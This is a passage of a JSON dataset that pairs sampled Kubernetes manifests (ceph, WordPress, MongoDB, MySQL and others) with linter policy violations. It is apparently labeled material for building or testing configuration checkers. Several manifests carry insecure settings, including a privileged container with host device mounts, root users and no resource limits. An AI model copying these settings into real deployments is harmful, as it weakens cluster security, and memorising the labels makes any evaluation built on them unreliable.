    "manifest_yaml": "apiVersion: v1\nkind: ReplicationController\nmetadata:\n  name: ceph-controller\n  namespace: ceph\nspec:\n  template:\n    metadata:\n      labels:\n        name: ceph-controller\n    spec:\n      volumes:\n      - name: localtime\n        hostPath:\n          path: /etc/localtime\n      - name: dev\n        hostPath:\n          path: /dev\n      - name: lib-modules\n        hostPath:\n          path: /lib/modules\n      containers:\n      - name: ceph-controller-pod\n        image: cdxvirt/ceph-daemon:latest\n        imagePullPolicy: IfNotPresent\n        securityContext:\n          privileged: true\n        args:\n        - cdx_controller\n        env:\n        - name: CEPH_PUBLIC_NETWORK\n          value: 192.168.32.0/23\n        - name: CEPH_CLUSTER_NETWORK\n          value: 192.168.32.0/23\n        - name: K8S_NETWORK\n          value: 192.168.32.0/23\n        - name: CDX_ENV\n          value: 'true'\n        volumeMounts:\n        - name: localtime\n          mountPath: /etc/localtime\n        - name: dev\n          mountPath: /dev\n        - name: lib-modules\n          mountPath: /lib/modules\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"ceph-controller-pod\" has memory limit 0"
  },
  {
    "id": "9823",
    "manifest_path": "data/manifests/the_stack_sample/sample_3770.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: command-demo\n  labels:\n    purpose: demonstrate-command\nspec:\n  containers:\n  - name: command-demo-container\n    image: joaodanielrufino/kubelet\n    command:\n    - kubelet\n    args: []\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"command-demo-container\" is using an invalid container image, \"joaodanielrufino/kubelet\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "9824",
    "manifest_path": "data/manifests/the_stack_sample/sample_3770.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: command-demo\n  labels:\n    purpose: demonstrate-command\nspec:\n  containers:\n  - name: command-demo-container\n    image: joaodanielrufino/kubelet\n    command:\n    - kubelet\n    args: []\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"command-demo-container\" does not have a read-only root file system"
  },
  {
    "id": "9825",
    "manifest_path": "data/manifests/the_stack_sample/sample_3770.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: command-demo\n  labels:\n    purpose: demonstrate-command\nspec:\n  containers:\n  - name: command-demo-container\n    image: joaodanielrufino/kubelet\n    command:\n    - kubelet\n    args: []\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"command-demo-container\" is not set to runAsNonRoot"
  },
  {
    "id": "9826",
    "manifest_path": "data/manifests/the_stack_sample/sample_3770.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: command-demo\n  labels:\n    purpose: demonstrate-command\nspec:\n  containers:\n  - name: command-demo-container\n    image: joaodanielrufino/kubelet\n    command:\n    - kubelet\n    args: []\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"command-demo-container\" has cpu request 0"
  },
  {
    "id": "9827",
    "manifest_path": "data/manifests/the_stack_sample/sample_3770.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: command-demo\n  labels:\n    purpose: demonstrate-command\nspec:\n  containers:\n  - name: command-demo-container\n    image: joaodanielrufino/kubelet\n    command:\n    - kubelet\n    args: []\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"command-demo-container\" has memory limit 0"
  },
  {
    "id": "9828",
    "manifest_path": "data/manifests/the_stack_sample/sample_3771.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: s04-deployment\n  namespace: scenario04\n  labels:\n    app: s04-app\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: s04-app\n  template:\n    metadata:\n      labels:\n        app: s04-app\n    spec:\n      containers:\n      - name: s04-container\n        image: wordpress:latest\n        ports:\n        - containerPort: 80\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"s04-container\" is using an invalid container image, \"wordpress:latest\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "9829",
    "manifest_path": "data/manifests/the_stack_sample/sample_3771.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: s04-deployment\n  namespace: scenario04\n  labels:\n    app: s04-app\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: s04-app\n  template:\n    metadata:\n      labels:\n        app: s04-app\n    spec:\n      containers:\n      - name: s04-container\n        image: wordpress:latest\n        ports:\n        - containerPort: 80\n",
    "policy_id": "no-anti-affinity",
    "violation_text": "object has 2 replicas but does not specify inter pod anti-affinity"
  },
  {
    "id": "9830",
    "manifest_path": "data/manifests/the_stack_sample/sample_3771.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: s04-deployment\n  namespace: scenario04\n  labels:\n    app: s04-app\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: s04-app\n  template:\n    metadata:\n      labels:\n        app: s04-app\n    spec:\n      containers:\n      - name: s04-container\n        image: wordpress:latest\n        ports:\n        - containerPort: 80\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"s04-container\" does not have a read-only root file system"
  },
  {
    "id": "9831",
    "manifest_path": "data/manifests/the_stack_sample/sample_3771.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: s04-deployment\n  namespace: scenario04\n  labels:\n    app: s04-app\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: s04-app\n  template:\n    metadata:\n      labels:\n        app: s04-app\n    spec:\n      containers:\n      - name: s04-container\n        image: wordpress:latest\n        ports:\n        - containerPort: 80\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"s04-container\" is not set to runAsNonRoot"
  },
  {
    "id": "9832",
    "manifest_path": "data/manifests/the_stack_sample/sample_3771.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: s04-deployment\n  namespace: scenario04\n  labels:\n    app: s04-app\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: s04-app\n  template:\n    metadata:\n      labels:\n        app: s04-app\n    spec:\n      containers:\n      - name: s04-container\n        image: wordpress:latest\n        ports:\n        - containerPort: 80\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"s04-container\" has cpu request 0"
  },
  {
    "id": "9833",
    "manifest_path": "data/manifests/the_stack_sample/sample_3771.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: s04-deployment\n  namespace: scenario04\n  labels:\n    app: s04-app\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: s04-app\n  template:\n    metadata:\n      labels:\n        app: s04-app\n    spec:\n      containers:\n      - name: s04-container\n        image: wordpress:latest\n        ports:\n        - containerPort: 80\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"s04-container\" has memory limit 0"
  },
  {
    "id": "9834",
    "manifest_path": "data/manifests/the_stack_sample/sample_3772.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app: custom-metrics-apiserver\n  name: custom-metrics-apiserver\n  namespace: custom-metrics\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: custom-metrics-apiserver\n  template:\n    metadata:\n      labels:\n        app: custom-metrics-apiserver\n      name: custom-metrics-apiserver\n    spec:\n      serviceAccountName: custom-metrics-apiserver\n      containers:\n      - name: custom-metrics-apiserver\n        imagePullPolicy: IfNotPresent\n        image: wavefronthq/wavefront-hpa-adapter:0.9.8\n        args:\n        - /wavefront-adapter\n        - --wavefront-url=https://<INSTANCE>.wavefront.com\n        - --wavefront-token=<TOKEN_HERE>\n        - --api-client-timeout=10s\n        - --wavefront-metric-prefix=kubernetes\n        - --cert-dir=/etc/ssl/certs\n        - --secure-port=6443\n        - --metrics-relist-interval=15m\n        - --external-metrics-config=/etc/adapter/config.yaml\n        - --logtostderr=true\n        ports:\n        - containerPort: 6443\n        volumeMounts:\n        - mountPath: /tmp\n          name: temp-vol\n        - mountPath: /etc/adapter/\n          name: config\n          readOnly: true\n      volumes:\n      - name: temp-vol\n        emptyDir: {}\n      - name: config\n        configMap:\n          name: adapter-config\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"custom-metrics-apiserver\" does not have a read-only root file system"
  },
  {
    "id": "9835",
    "manifest_path": "data/manifests/the_stack_sample/sample_3772.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app: custom-metrics-apiserver\n  name: custom-metrics-apiserver\n  namespace: custom-metrics\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: custom-metrics-apiserver\n  template:\n    metadata:\n      labels:\n        app: custom-metrics-apiserver\n      name: custom-metrics-apiserver\n    spec:\n      serviceAccountName: custom-metrics-apiserver\n      containers:\n      - name: custom-metrics-apiserver\n        imagePullPolicy: IfNotPresent\n        image: wavefronthq/wavefront-hpa-adapter:0.9.8\n        args:\n        - /wavefront-adapter\n        - --wavefront-url=https://<INSTANCE>.wavefront.com\n        - --wavefront-token=<TOKEN_HERE>\n        - --api-client-timeout=10s\n        - --wavefront-metric-prefix=kubernetes\n        - --cert-dir=/etc/ssl/certs\n        - --secure-port=6443\n        - --metrics-relist-interval=15m\n        - --external-metrics-config=/etc/adapter/config.yaml\n        - --logtostderr=true\n        ports:\n        - containerPort: 6443\n        volumeMounts:\n        - mountPath: /tmp\n          name: temp-vol\n        - mountPath: /etc/adapter/\n          name: config\n          readOnly: true\n      volumes:\n      - name: temp-vol\n        emptyDir: {}\n      - name: config\n        configMap:\n          name: adapter-config\n",
    "policy_id": "non-existent-service-account",
    "violation_text": "serviceAccount \"custom-metrics-apiserver\" not found"
  },
  {
    "id": "9836",
    "manifest_path": "data/manifests/the_stack_sample/sample_3772.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app: custom-metrics-apiserver\n  name: custom-metrics-apiserver\n  namespace: custom-metrics\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: custom-metrics-apiserver\n  template:\n    metadata:\n      labels:\n        app: custom-metrics-apiserver\n      name: custom-metrics-apiserver\n    spec:\n      serviceAccountName: custom-metrics-apiserver\n      containers:\n      - name: custom-metrics-apiserver\n        imagePullPolicy: IfNotPresent\n        image: wavefronthq/wavefront-hpa-adapter:0.9.8\n        args:\n        - /wavefront-adapter\n        - --wavefront-url=https://<INSTANCE>.wavefront.com\n        - --wavefront-token=<TOKEN_HERE>\n        - --api-client-timeout=10s\n        - --wavefront-metric-prefix=kubernetes\n        - --cert-dir=/etc/ssl/certs\n        - --secure-port=6443\n        - --metrics-relist-interval=15m\n        - --external-metrics-config=/etc/adapter/config.yaml\n        - --logtostderr=true\n        ports:\n        - containerPort: 6443\n        volumeMounts:\n        - mountPath: /tmp\n          name: temp-vol\n        - mountPath: /etc/adapter/\n          name: config\n          readOnly: true\n      volumes:\n      - name: temp-vol\n        emptyDir: {}\n      - name: config\n        configMap:\n          name: adapter-config\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"custom-metrics-apiserver\" is not set to runAsNonRoot"
  },
  {
    "id": "9837",
    "manifest_path": "data/manifests/the_stack_sample/sample_3772.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app: custom-metrics-apiserver\n  name: custom-metrics-apiserver\n  namespace: custom-metrics\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: custom-metrics-apiserver\n  template:\n    metadata:\n      labels:\n        app: custom-metrics-apiserver\n      name: custom-metrics-apiserver\n    spec:\n      serviceAccountName: custom-metrics-apiserver\n      containers:\n      - name: custom-metrics-apiserver\n        imagePullPolicy: IfNotPresent\n        image: wavefronthq/wavefront-hpa-adapter:0.9.8\n        args:\n        - /wavefront-adapter\n        - --wavefront-url=https://<INSTANCE>.wavefront.com\n        - --wavefront-token=<TOKEN_HERE>\n        - --api-client-timeout=10s\n        - --wavefront-metric-prefix=kubernetes\n        - --cert-dir=/etc/ssl/certs\n        - --secure-port=6443\n        - --metrics-relist-interval=15m\n        - --external-metrics-config=/etc/adapter/config.yaml\n        - --logtostderr=true\n        ports:\n        - containerPort: 6443\n        volumeMounts:\n        - mountPath: /tmp\n          name: temp-vol\n        - mountPath: /etc/adapter/\n          name: config\n          readOnly: true\n      volumes:\n      - name: temp-vol\n        emptyDir: {}\n      - name: config\n        configMap:\n          name: adapter-config\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"custom-metrics-apiserver\" has cpu request 0"
  },
  {
    "id": "9838",
    "manifest_path": "data/manifests/the_stack_sample/sample_3772.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app: custom-metrics-apiserver\n  name: custom-metrics-apiserver\n  namespace: custom-metrics\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: custom-metrics-apiserver\n  template:\n    metadata:\n      labels:\n        app: custom-metrics-apiserver\n      name: custom-metrics-apiserver\n    spec:\n      serviceAccountName: custom-metrics-apiserver\n      containers:\n      - name: custom-metrics-apiserver\n        imagePullPolicy: IfNotPresent\n        image: wavefronthq/wavefront-hpa-adapter:0.9.8\n        args:\n        - /wavefront-adapter\n        - --wavefront-url=https://<INSTANCE>.wavefront.com\n        - --wavefront-token=<TOKEN_HERE>\n        - --api-client-timeout=10s\n        - --wavefront-metric-prefix=kubernetes\n        - --cert-dir=/etc/ssl/certs\n        - --secure-port=6443\n        - --metrics-relist-interval=15m\n        - --external-metrics-config=/etc/adapter/config.yaml\n        - --logtostderr=true\n        ports:\n        - containerPort: 6443\n        volumeMounts:\n        - mountPath: /tmp\n          name: temp-vol\n        - mountPath: /etc/adapter/\n          name: config\n          readOnly: true\n      volumes:\n      - name: temp-vol\n        emptyDir: {}\n      - name: config\n        configMap:\n          name: adapter-config\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"custom-metrics-apiserver\" has memory limit 0"
  },
  {
    "id": "9839",
    "manifest_path": "data/manifests/the_stack_sample/sample_3773.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  name: pythonsample\nspec:\n  type: LoadBalancer\n  ports:\n  - port: 8000\n  selector:\n    app: pythonsample\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[app:pythonsample])"
  },
  {
    "id": "9840",
    "manifest_path": "data/manifests/the_stack_sample/sample_3774.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  labels:\n    name: controller\n  name: controller\nspec:\n  type: NodePort\n  ports:\n  - port: 10001\n    targetPort: 8080\n  selector:\n    app: controller\n    stage: dev\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[app:controller stage:dev])"
  },
  {
    "id": "9841",
    "manifest_path": "data/manifests/the_stack_sample/sample_3775.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  labels:\n    app: controller\n    serving.knative.dev/release: devel\n  name: controller\n  namespace: knative-serving\nspec:\n  ports:\n  - name: http-metrics\n    port: 9090\n    protocol: TCP\n    targetPort: 9090\n  selector:\n    app: controller\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[app:controller])"
  },
  {
    "id": "9842",
    "manifest_path": "data/manifests/the_stack_sample/sample_3776.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app: mongo\n  name: mongo\n  namespace: mongo\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: mongo\n  template:\n    metadata:\n      labels:\n        app: mongo\n    spec:\n      containers:\n      - image: mongo\n        name: mongo\n        args:\n        - --dbpath\n        - /data/db\n        livenessProbe:\n          exec:\n            command:\n            - mongo\n            - --disableImplicitSessions\n            - --eval\n            - db.adminCommand('ping')\n          initialDelaySeconds: 30\n          periodSeconds: 10\n          timeoutSeconds: 5\n          successThreshold: 1\n          failureThreshold: 6\n        readinessProbe:\n          exec:\n            command:\n            - mongo\n            - --disableImplicitSessions\n            - --eval\n            - db.adminCommand('ping')\n          initialDelaySeconds: 30\n          periodSeconds: 10\n          timeoutSeconds: 5\n          successThreshold: 1\n          failureThreshold: 6\n        env:\n        - name: MONGO_INITDB_ROOT_USERNAME\n          valueFrom:\n            secretKeyRef:\n              name: mongo-creds\n              key: username\n        - name: MONGO_INITDB_ROOT_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: mongo-creds\n              key: password\n        volumeMounts:\n        - name: mongo-data-dir\n          mountPath: /data/db\n        resources:\n          requests:\n            cpu: 50m\n            memory: 50Mi\n          limits:\n            cpu: 100m\n            memory: 100Mi\n      volumes:\n      - name: mongo-data-dir\n        persistentVolumeClaim:\n          claimName: mongo-data\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"mongo\" is using an invalid container image, \"mongo\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "9843",
    "manifest_path": "data/manifests/the_stack_sample/sample_3776.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app: mongo\n  name: mongo\n  namespace: mongo\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: mongo\n  template:\n    metadata:\n      labels:\n        app: mongo\n    spec:\n      containers:\n      - image: mongo\n        name: mongo\n        args:\n        - --dbpath\n        - /data/db\n        livenessProbe:\n          exec:\n            command:\n            - mongo\n            - --disableImplicitSessions\n            - --eval\n            - db.adminCommand('ping')\n          initialDelaySeconds: 30\n          periodSeconds: 10\n          timeoutSeconds: 5\n          successThreshold: 1\n          failureThreshold: 6\n        readinessProbe:\n          exec:\n            command:\n            - mongo\n            - --disableImplicitSessions\n            - --eval\n            - db.adminCommand('ping')\n          initialDelaySeconds: 30\n          periodSeconds: 10\n          timeoutSeconds: 5\n          successThreshold: 1\n          failureThreshold: 6\n        env:\n        - name: MONGO_INITDB_ROOT_USERNAME\n          valueFrom:\n            secretKeyRef:\n              name: mongo-creds\n              key: username\n        - name: MONGO_INITDB_ROOT_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: mongo-creds\n              key: password\n        volumeMounts:\n        - name: mongo-data-dir\n          mountPath: /data/db\n        resources:\n          requests:\n            cpu: 50m\n            memory: 50Mi\n          limits:\n            cpu: 100m\n            memory: 100Mi\n      volumes:\n      - name: mongo-data-dir\n        persistentVolumeClaim:\n          claimName: mongo-data\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"mongo\" does not have a read-only root file system"
  },
  {
    "id": "9844",
    "manifest_path": "data/manifests/the_stack_sample/sample_3776.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app: mongo\n  name: mongo\n  namespace: mongo\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: mongo\n  template:\n    metadata:\n      labels:\n        app: mongo\n    spec:\n      containers:\n      - image: mongo\n        name: mongo\n        args:\n        - --dbpath\n        - /data/db\n        livenessProbe:\n          exec:\n            command:\n            - mongo\n            - --disableImplicitSessions\n            - --eval\n            - db.adminCommand('ping')\n          initialDelaySeconds: 30\n          periodSeconds: 10\n          timeoutSeconds: 5\n          successThreshold: 1\n          failureThreshold: 6\n        readinessProbe:\n          exec:\n            command:\n            - mongo\n            - --disableImplicitSessions\n            - --eval\n            - db.adminCommand('ping')\n          initialDelaySeconds: 30\n          periodSeconds: 10\n          timeoutSeconds: 5\n          successThreshold: 1\n          failureThreshold: 6\n        env:\n        - name: MONGO_INITDB_ROOT_USERNAME\n          valueFrom:\n            secretKeyRef:\n              name: mongo-creds\n              key: username\n        - name: MONGO_INITDB_ROOT_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: mongo-creds\n              key: password\n        volumeMounts:\n        - name: mongo-data-dir\n          mountPath: /data/db\n        resources:\n          requests:\n            cpu: 50m\n            memory: 50Mi\n          limits:\n            cpu: 100m\n            memory: 100Mi\n      volumes:\n      - name: mongo-data-dir\n        persistentVolumeClaim:\n          claimName: mongo-data\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"mongo\" is not set to runAsNonRoot"
  },
  {
    "id": "9845",
    "manifest_path": "data/manifests/the_stack_sample/sample_3779.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: mysql\n  namespace: blog\n  labels:\n    app: blog\nspec:\n  selector:\n    matchLabels:\n      app: blog\n      tier: mysql\n  template:\n    metadata:\n      labels:\n        app: blog\n        tier: mysql\n    spec:\n      containers:\n      - image: mysql:8.0.27\n        name: mysql\n        env:\n        - name: MYSQL_ROOT_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: mysql-pass\n              key: password\n        ports:\n        - containerPort: 3306\n          name: mysql\n        volumeMounts:\n        - name: mysql-persistent-storage\n          mountPath: /var/lib/mysql\n      volumes:\n      - name: mysql-persistent-storage\n        persistentVolumeClaim:\n          claimName: mysql-pvc\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"mysql\" does not have a read-only root file system"
  },
  {
    "id": "9846",
    "manifest_path": "data/manifests/the_stack_sample/sample_3779.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: mysql\n  namespace: blog\n  labels:\n    app: blog\nspec:\n  selector:\n    matchLabels:\n      app: blog\n      tier: mysql\n  template:\n    metadata:\n      labels:\n        app: blog\n        tier: mysql\n    spec:\n      containers:\n      - image: mysql:8.0.27\n        name: mysql\n        env:\n        - name: MYSQL_ROOT_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: mysql-pass\n              key: password\n        ports:\n        - containerPort: 3306\n          name: mysql\n        volumeMounts:\n        - name: mysql-persistent-storage\n          mountPath: /var/lib/mysql\n      volumes:\n      - name: mysql-persistent-storage\n        persistentVolumeClaim:\n          claimName: mysql-pvc\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"mysql\" is not set to runAsNonRoot"
  },
  {
    "id": "9847",
    "manifest_path": "data/manifests/the_stack_sample/sample_3779.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: mysql\n  namespace: blog\n  labels:\n    app: blog\nspec:\n  selector:\n    matchLabels:\n      app: blog\n      tier: mysql\n  template:\n    metadata:\n      labels:\n        app: blog\n        tier: mysql\n    spec:\n      containers:\n      - image: mysql:8.0.27\n        name: mysql\n        env:\n        - name: MYSQL_ROOT_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: mysql-pass\n              key: password\n        ports:\n        - containerPort: 3306\n          name: mysql\n        volumeMounts:\n        - name: mysql-persistent-storage\n          mountPath: /var/lib/mysql\n      volumes:\n      - name: mysql-persistent-storage\n        persistentVolumeClaim:\n          claimName: mysql-pvc\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"mysql\" has cpu request 0"
  },
  {
    "id": "9848",
    "manifest_path": "data/manifests/the_stack_sample/sample_3779.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: mysql\n  namespace: blog\n  labels:\n    app: blog\nspec:\n  selector:\n    matchLabels:\n      app: blog\n      tier: mysql\n  template:\n    metadata:\n      labels:\n        app: blog\n        tier: mysql\n    spec:\n      containers:\n      - image: mysql:8.0.27\n        name: mysql\n        env:\n        - name: MYSQL_ROOT_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: mysql-pass\n              key: password\n        ports:\n        - containerPort: 3306\n          name: mysql\n        volumeMounts:\n        - name: mysql-persistent-storage\n          mountPath: /var/lib/mysql\n      volumes:\n      - name: mysql-persistent-storage\n        persistentVolumeClaim:\n          claimName: mysql-pvc\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"mysql\" has memory limit 0"
  },
  {
    "id": "9849",
    "manifest_path": "data/manifests/the_stack_sample/sample_3780.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    service: reverseproxy\n  name: reverseproxy\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      service: reverseproxy\n  template:\n    metadata:\n      labels:\n        service: reverseproxy\n    spec:\n      containers:\n      - image: officialphemi/reverse-proxy\n        name: reverseproxy\n        imagePullPolicy: Always\n        ports:\n        - containerPort: 8080\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"reverseproxy\" is using an invalid container image, \"officialphemi/reverse-proxy\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "9850",
    "manifest_path": "data/manifests/the_stack_sample/sample_3780.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    service: reverseproxy\n  name: reverseproxy\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      service: reverseproxy\n  template:\n    metadata:\n      labels:\n        service: reverseproxy\n    spec:\n      containers:\n      - image: officialphemi/reverse-proxy\n        name: reverseproxy\n        imagePullPolicy: Always\n        ports:\n        - containerPort: 8080\n",
    "policy_id": "no-anti-affinity",
    "violation_text": "object has 2 replicas but does not specify inter pod anti-affinity"
  },
  {
    "id": "9851",
    "manifest_path": "data/manifests/the_stack_sample/sample_3780.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    service: reverseproxy\n  name: reverseproxy\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      service: reverseproxy\n  template:\n    metadata:\n      labels:\n        service: reverseproxy\n    spec:\n      containers:\n      - image: officialphemi/reverse-proxy\n        name: reverseproxy\n        imagePullPolicy: Always\n        ports:\n        - containerPort: 8080\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"reverseproxy\" does not have a read-only root file system"
  },
  {
    "id": "9852",
    "manifest_path": "data/manifests/the_stack_sample/sample_3780.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    service: reverseproxy\n  name: reverseproxy\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      service: reverseproxy\n  template:\n    metadata:\n      labels:\n        service: reverseproxy\n    spec:\n      containers:\n      - image: officialphemi/reverse-proxy\n        name: reverseproxy\n        imagePullPolicy: Always\n        ports:\n        - containerPort: 8080\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"reverseproxy\" is not set to runAsNonRoot"
  },
  {
    "id": "9853",
    "manifest_path": "data/manifests/the_stack_sample/sample_3780.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    service: reverseproxy\n  name: reverseproxy\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      service: reverseproxy\n  template:\n    metadata:\n      labels:\n        service: reverseproxy\n    spec:\n      containers:\n      - image: officialphemi/reverse-proxy\n        name: reverseproxy\n        imagePullPolicy: Always\n        ports:\n        - containerPort: 8080\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"reverseproxy\" has cpu request 0"
  },
  {
    "id": "9854",
    "manifest_path": "data/manifests/the_stack_sample/sample_3780.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    service: reverseproxy\n  name: reverseproxy\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      service: reverseproxy\n  template:\n    metadata:\n      labels:\n        service: reverseproxy\n    spec:\n      containers:\n      - image: officialphemi/reverse-proxy\n        name: reverseproxy\n        imagePullPolicy: Always\n        ports:\n        - containerPort: 8080\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"reverseproxy\" has memory limit 0"
  },
  {
    "id": "9855",
    "manifest_path": "data/manifests/the_stack_sample/sample_3781.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: config-server\nspec:\n  selector:\n    matchLabels:\n      app: config-server\n  template:\n    metadata:\n      labels:\n        app: config-server\n    spec:\n      containers:\n      - name: config-server\n        image: hands-on/config-server:v1\n        env:\n        - name: LOGGING_LEVEL_ROOT\n          value: WARN\n        - name: MANAGEMENT_ENDPOINTS_WEB_EXPOSURE_INCLUDE\n          value: health,info\n        resources:\n          requests:\n            memory: 200Mi\n          limits:\n            memory: 400Mi\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"config-server\" does not have a read-only root file system"
  },
  {
    "id": "9856",
    "manifest_path": "data/manifests/the_stack_sample/sample_3781.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: config-server\nspec:\n  selector:\n    matchLabels:\n      app: config-server\n  template:\n    metadata:\n      labels:\n        app: config-server\n    spec:\n      containers:\n      - name: config-server\n        image: hands-on/config-server:v1\n        env:\n        - name: LOGGING_LEVEL_ROOT\n          value: WARN\n        - name: MANAGEMENT_ENDPOINTS_WEB_EXPOSURE_INCLUDE\n          value: health,info\n        resources:\n          requests:\n            memory: 200Mi\n          limits:\n            memory: 400Mi\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"config-server\" is not set to runAsNonRoot"
  },
  {
    "id": "9857",
    "manifest_path": "data/manifests/the_stack_sample/sample_3781.yaml",
